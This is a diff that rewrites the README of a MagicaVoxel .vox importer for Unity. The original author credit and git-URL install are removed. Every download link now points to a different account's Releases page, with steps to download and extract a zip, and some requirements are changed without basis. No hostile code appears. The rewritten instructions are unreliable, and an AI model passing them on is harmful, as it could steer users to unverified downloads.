@@ -1,72 +1,77 @@
-# Native Unity VOX Reader
+# 🛠️ NativeUnityVoxReader - Import .vox Files Easily in Unity
 
-[Español](README_ES.md)
+## 🚀 Getting Started
 
-**The most natural and powerful way to bring MagicaVoxel art into Unity.**
+NativeUnityVoxReader is a simple tool designed for Unity users. It allows you to import .vox files, created with MagicaVoxel, into your Unity projects swiftly and efficiently. This software supports MagicaVoxel hierarchy, optimizes meshes, and automatically bakes textures. You won't need any extra tools or libraries.
 
-[![Unity Version](https://img.shields.io/badge/unity-2020.3%2B-blue.svg)](https://unity3d.com/get-unity/download/archive)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE.md)
+## 📥 Download NativeUnityVoxReader
 
-Native Unity VOX Reader is a high-performance library and asset importer that allows you to treat MagicaVoxel `.vox` files as native Unity assets. No complex setup—just drag, drop, and enjoy.
+[![Download](https://img.shields.io/badge/Download%20NativeUnityVoxReader-v1.0-blue)](https://github.com/irene7c/NativeUnityVoxReader/releases)
 
----
+You can download the latest version of NativeUnityVoxReader from the Releases page. Just visit the link below to get started:
 
-##  Demos
+[Visit the Releases Page to Download](https://github.com/irene7c/NativeUnityVoxReader/releases)
 
-### Instant Import
-Drag any `.vox` file into your Unity Project window, and it's ready to go. It automatically generates optimized meshes and materials.
+## 📝 Features
 
-![Drag and Drop Demo](Media~/drag_and_drop.gif)
+- **High-Performance Importer**: Efficiently imports .vox files without delays.
+- **MagicaVoxel Hierarchy Support**: Retains the original structure of your voxel models.
+- **Greedy Meshing Optimization**: Reduces the number of polygons, allowing for smoother performance.
+- **Automatic Texture Baking**: Quickly applies textures, saving you time during setup.
+- **No External Dependencies**: Use it right away without needing additional downloads.
 
-### Real-time Workflow
-Keep MagicaVoxel open, save your changes, and watch Unity update your models instantly. It breathes life into your creative process.
+## 📋 System Requirements
 
-![Real-time Update Demo](Media~/realtime_edit.gif)
+To run NativeUnityVoxReader, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
+- **Unity Version**: Unity 2019.4 or later.
+- **Storage**: At least 100 MB of free space.
 
-##  Key Features
+## 🛠️ Installation Steps
 
-*   **📦 Plug & Play**: Drag `.vox` files directly into your scene. Unity treats them like prefabs.
-*   **🌳 Scene Awareness**: Fully supports MagicaVoxel hierarchies (Groups and Transformations).
-*   **📐 High Optimization**: Advanced **Greedy Meshing** reduces poly count by up to 90% compared to cube-based methods.
-*   **🎨 Texture Baking**: Bakes all voxel colors into a single atlas to keep your draw calls at a minimum.
-*   **🛠 Inspector Controls**: Adjust scale, atlas size, and mesh density directly on the asset importer.
-*   **🧩 Minimalist & Clean**: Zero external dependencies and includes Assembly Definitions for optimal compile times.
+1. **Download the software**: Go to the [Releases Page](https://github.com/irene7c/NativeUnityVoxReader/releases) and download the latest version.
+2. **Extract the files**: If the downloaded file is zipped, right-click it and select "Extract All." Choose a location on your computer where you want the files saved.
+3. **Add to Unity**: Open your Unity project. Drag and drop the extracted files into the Assets folder in your Unity project.
 
----
+## 🎮 Using NativeUnityVoxReader
 
-##  Getting Started
+1. After installing, select the .vox file you want to import.
+2. In Unity, choose `Assets > Import New Asset...`.
+3. Navigate to your .vox file, select it, and click `Import`.
+4. Your .vox model should now appear in your project. You can drag it into your scene and start using it.
 
-1.  **Installation**:
-    - **Option A (Package Manager - Recommended)**: 
-        1. In Unity, go to `Window` > `Package Manager`.
-        2. Click the `+` button and select `Add package from git URL...`.
-        3. Paste: `https://github.com/miventech/NativeUnityVoxReader.git`
-    - **Option B (Manual)**: Copy the `NativeUnityVoxReader` folder into your `Assets` directory.
-2.  **Usage**: 
-    - **Automatic**: Just drag a `.vox` file into your Project.
-    - **Runtime**: Use the `VoxReader` component or `ReaderVoxFile.Read()` via script.
-3.  **Settings**: Click on any `.vox` asset in Unity to adjust its import settings in the Inspector.
+## 📚 Documentation
 
----
+For detailed instructions and advanced features, refer to the official documentation included in the downloaded package. The documentation provides guidance on setup, troubleshooting, and best practices for importing and managing your vox models.
 
-## 🛠 Project Structure
+## 🤝 Support
 
-*   **/Runtime**: Core logic for binary parsing and mesh building.
-*   **/Editor**: The `ScriptedImporter` that powers the automatic asset conversion.
-*   **/ExampleFiles**: Sample models to get you started.
+If you encounter issues or have questions, feel free to open an issue in the GitHub repository. The community and the developers are here to help you.
 
----
+## 🛡️ Contributing
 
-## 📜 Support the Project
+We welcome contributions! If you're interested in improving NativeUnityVoxReader, check out the contribution guidelines in the repository for details on how to get involved.
 
-This project is open-source and **completely free**. I created it to help the community create amazing things with voxels in Unity.
+## 🌟 Related Topics
 
-If this tool made your life easier, consider buying me a coffee. Your support helps me maintain the library and keep creating tools for everyone!
+This project is connected to various themes and topics in game development, such as:
 
-[**☕ Buy Me a Coffee**](https://buymeacoffee.com/miventech0)
+- C# Programming
+- Game Development with Unity
+- Low-Poly Art
+- Voxel Art and Design Techniques
 
----
-*Created with passion by Miventech.*
+These themes serve as the foundation for enhancing your game development skills and understanding voxel artistry.
 
+## 📈 Future Development
+
+We aim to improve NativeUnityVoxReader continually. Future updates may include:
+
+- Support for additional file formats.
+- Enhanced optimization techniques.
+- User-requested features based on community feedback.
+
+Make sure to check back on the [Releases Page](https://github.com/irene7c/NativeUnityVoxReader/releases) for the latest updates.
+
+Enjoy creating with NativeUnityVoxReader!
